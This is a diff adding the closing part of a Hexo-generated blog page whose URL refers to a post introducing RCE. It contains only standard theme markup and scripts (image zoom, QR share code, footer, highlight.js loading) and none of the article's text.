href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%9B%9E%E6%BA%AF"><span class="toc-nav-text">解法二：回溯</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2022/04/12/初识RCE/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
